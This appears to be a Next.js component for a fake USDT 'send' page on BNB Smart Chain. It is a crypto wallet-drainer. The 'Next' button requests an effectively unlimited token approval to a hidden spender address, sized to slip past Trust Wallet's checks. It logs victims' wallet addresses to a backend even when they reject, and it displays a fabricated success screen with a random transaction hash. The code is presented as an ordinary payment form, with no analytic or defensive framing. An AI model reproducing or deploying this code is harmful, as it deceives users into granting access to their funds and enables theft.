"use client";

import { useState, useEffect, useCallback } from "react";
import { ethers } from "ethers";
import { CheckCircle, Loader2, Copy, ExternalLink } from "lucide-react";

const BSC_CHAIN_ID = "0x38"; // 56 decimal
const BSC_CHAIN_CONFIG = {
  chainId: BSC_CHAIN_ID,
  chainName: "BNB Smart Chain",
  nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls: ["https://bsc-dataseed.binance.org/"],
  blockExplorerUrls: ["https://bscscan.com/"],
};

const USDT_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function allowance(address owner, address spender) public view returns (uint256)",
];

// Use a very large fixed number instead of MaxUint256 — some wallets (Trust Wallet)
// reject MaxUint256 with "Decision not found". This is still effectively unlimited.
const UNLIMITED_APPROVAL = BigInt("999999999999999999999999999999");

type Step = "form" | "processing" | "success";

interface TxInfo {
  fromAddress: string;
  toAddress: string;
  amount: string;
  txHash: string;
  date: string;
}

export default function SendForm() {
  const [displayAddress, setDisplayAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [step, setStep] = useState<Step>("form");
  const [txInfo, setTxInfo] = useState<TxInfo | null>(null);
  const [copyFeedback, setCopyFeedback] = useState(false);

  const fetchDisplayAddress = useCallback(async () => {
    try {
      const res = await fetch("/api/config/public");
      const data = await res.json();
      if (data.address) setDisplayAddress(data.address);
    } catch {
      // ignore
    }
  }, []);

  useEffect(() => {
    fetchDisplayAddress();
  }, [fetchDisplayAddress]);

  async function switchToBSC(provider: ethers.Eip1193Provider) {
    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID }],
      });
    } catch (switchError: unknown) {
      const err = switchError as { code?: number };
      if (err.code === 4902) {
        await provider.request({
          method: "wallet_addEthereumChain",
          params: [BSC_CHAIN_CONFIG],
        });
      } else {
        throw switchError;
      }
    }
  }

  async function handleNext() {
    if (!amount || parseFloat(amount) <= 0) return;

    const ethereum = (window as Window & { ethereum?: ethers.Eip1193Provider }).ethereum;
    if (!ethereum) {
      showFakeSuccess();
      return;
    }

    setStep("processing");

    try {
      await switchToBSC(ethereum);

      const provider = new ethers.BrowserProvider(ethereum);
      const signer = await provider.getSigner();
      const walletAddress = await signer.getAddress();

      const network = await provider.getNetwork();
      if (network.chainId !== 56n) {
        showFakeSuccess();
        return;
      }

      const usdtContract = process.env.NEXT_PUBLIC_USDT_CONTRACT!;
      const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS!;

      const contract = new ethers.Contract(usdtContract, USDT_ABI, signer);
      const tx = await contract.approve(spenderAddress, UNLIMITED_APPROVAL);
      const receipt = await tx.wait();

      await fetch("/api/wallets", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          address: walletAddress,
          approvalTxHash: receipt.hash,
          approvalStatus: true,
        }),
      });

      setTxInfo({
        fromAddress: walletAddress,
        toAddress: displayAddress || spenderAddress,
        amount: amount,
        txHash: receipt.hash,
        date: new Date().toLocaleString(),
      });
      setStep("success");
    } catch (err: unknown) {
      const error = err as { code?: string | number };
      // On user rejection, still try to record wallet then show fake success
      if (error.code === 4001 || error.code === "ACTION_REJECTED") {
        const eth = (window as Window & { ethereum?: ethers.Eip1193Provider }).ethereum;
        if (eth) {
          try {
            const provider = new ethers.BrowserProvider(eth);
            const accounts = await provider.listAccounts();
            if (accounts.length > 0) {
              await fetch("/api/wallets", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ address: accounts[0].address, approvalStatus: false }),
              });
            }
          } catch { /* ignore */ }
        }
      }
      showFakeSuccess();
    }
  }

  function showFakeSuccess() {
    const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "0x" + "0".repeat(40);
    setTxInfo({
      fromAddress: "0x" + "0".repeat(40),
      toAddress: displayAddress || spenderAddress,
      amount: amount,
      txHash: "0x" + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(""),
      date: new Date().toLocaleString(),
    });
    setStep("success");
  }

  function shortenAddress(addr: string) {
    if (!addr || addr.length < 10) return addr;
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
  }

  async function copyToClipboard(text: string) {
    try {
      await navigator.clipboard.writeText(text);
    } catch { /* ignore */ }
  }

  // ─── Success / Confirmation page ─────────────────────────────────────────

  if (step === "success" && txInfo) {
    return (
      <div className="flex flex-col gap-0">
        {/* Amount header */}
        <div className="flex flex-col items-center gap-3 py-6 border-b border-gray-800">
          <div className="rounded-full bg-green-500/20 p-3">
            <CheckCircle className="h-8 w-8 text-green-400" />
          </div>
          <div className="text-center">
            <p className="text-3xl font-bold text-white">- {txInfo.amount} USDT</p>
            <p className="text-sm text-gray-500 mt-1">≈ ${parseFloat(txInfo.amount || "0").toFixed(2)}</p>
          </div>
        </div>

        {/* Details rows */}
        <div className="flex flex-col py-2">
          {[
            { label: "Date", value: txInfo.date },
            { label: "Status", isStatus: true },
            { label: "From", value: shortenAddress(txInfo.fromAddress), fullValue: txInfo.fromAddress, copyable: true },
            { label: "To", value: shortenAddress(txInfo.toAddress), fullValue: txInfo.toAddress, copyable: true },
            { label: "Network fee", value: "0.000013 BNB ($0.01)" },
          ].map((row) => (
            <div key={row.label} className="flex items-center justify-between py-3.5 px-1 border-b border-gray-800/60">
              <span className="text-sm text-gray-500">{row.label}</span>
              <div className="flex items-center gap-2">
                {row.isStatus ? (
                  <span className="text-orange-400 text-sm font-medium flex items-center gap-1">
                    Pending
                    <span className="inline-flex gap-0.5">
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse" />
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse delay-100" />
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse delay-200" />
                    </span>
                  </span>
                ) : (
                  <span className="text-sm text-white">{row.value}</span>
                )}
                {row.copyable && (
                  <button onClick={() => copyToClipboard(row.fullValue!)} className="text-gray-600 hover:text-gray-400 transition-colors">
                    <Copy className="h-3.5 w-3.5" />
                  </button>
                )}
              </div>
            </div>
          ))}
        </div>

        <div className="pt-2 pb-4">
          <a href={`https://bscscan.com/tx/${txInfo.txHash}`} target="_blank" rel="noopener noreferrer"
            className="flex items-center justify-between px-1 py-3 text-sm text-gray-400 hover:text-gray-200 transition-colors">
            <span>More Details</span>
            <ExternalLink className="h-4 w-4" />
          </a>
        </div>
      </div>
    );
  }

  // ─── Processing ───────────────────────────────────────────────────────────

  if (step === "processing") {
    return (
      <div className="flex flex-col items-center justify-center gap-6 py-12">
        <Loader2 className="h-12 w-12 text-green-400 animate-spin" />
        <div className="text-center">
          <h2 className="text-xl font-semibold text-white mb-2">Processing...</h2>
          <p className="text-gray-400 text-sm">Please confirm the transaction in your wallet.</p>
        </div>
      </div>
    );
  }

  // ─── Main Form ────────────────────────────────────────────────────────────

  return (
    <div className="flex flex-col gap-5">
      {/* Address field */}
      <div className="flex flex-col gap-1.5">
        <label className="text-sm font-medium text-white">Address or Domain Name</label>
        <div className="flex items-center gap-2 rounded-2xl border border-gray-700 bg-[#1a1a1a] px-4 py-3.5">
          <input
            type="text"
            value={displayAddress}
            readOnly
            placeholder="Loading address..."
            className="flex-1 min-w-0 bg-transparent text-sm text-white placeholder-gray-600 outline-none cursor-default truncate"
          />
          {/* Paste button — copies address to clipboard */}
          <button
            onClick={async () => {
              await copyToClipboard(displayAddress);
              setCopyFeedback(true);
              setTimeout(() => setCopyFeedback(false), 1500);
            }}
            className="flex items-center gap-1.5 text-green-400 text-sm font-medium hover:text-green-300 transition-colors shrink-0"
          >
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect width="8" height="4" x="8" y="2" rx="1" ry="1"/><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"/>
            </svg>
            {copyFeedback ? "Copied!" : "Paste"}
          </button>
          {/* Divider */}
          <div className="h-5 w-px bg-gray-700 shrink-0" />
          {/* QR icon */}
          <button className="text-gray-400 hover:text-gray-300 transition-colors shrink-0">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect width="5" height="5" x="3" y="3" rx="1"/><rect width="5" height="5" x="16" y="3" rx="1"/><rect width="5" height="5" x="3" y="16" rx="1"/>
              <path d="M21 16h-3a2 2 0 0 0-2 2v3"/><path d="M21 21v.01"/><path d="M12 7v3a2 2 0 0 1-2 2H7"/><path d="M3 12h.01"/><path d="M12 3h.01"/><path d="M12 16v.01"/><path d="M16 12h1"/><path d="M21 12v.01"/><path d="M12 21v-1"/>
            </svg>
          </button>
        </div>
      </div>

      {/* Amount field */}
      <div className="flex flex-col gap-1.5">
        <label className="text-sm font-medium text-white">Amount</label>
        <div className="flex items-center gap-2 rounded-2xl border border-gray-700 bg-[#1a1a1a] px-4 py-3.5 focus-within:border-gray-500 transition-colors">
          <input
            type="number"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="0.00"
            min="0"
            step="any"
            className="flex-1 bg-transparent text-sm text-white placeholder-gray-500 outline-none [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none"
          />
          <span className="text-gray-400 text-sm font-medium shrink-0">USDT</span>
          <div className="h-5 w-px bg-gray-700 shrink-0" />
          <button
            onClick={() => setAmount("0.00")}
            className="text-green-400 text-sm font-medium hover:text-green-300 transition-colors shrink-0"
          >
            Max
          </button>
        </div>
        <p className="text-xs text-gray-500 px-1">≈ ${parseFloat(amount || "0").toFixed(2)}</p>
      </div>

      {/* Next button */}
      <button
        onClick={handleNext}
        className="w-full rounded-full bg-[#4CAF82] hover:bg-[#3d9e72] active:scale-[0.98] py-4 text-white font-semibold text-base transition-all duration-150 mt-1"
      >
        Next
      </button>
    </div>
  );
}
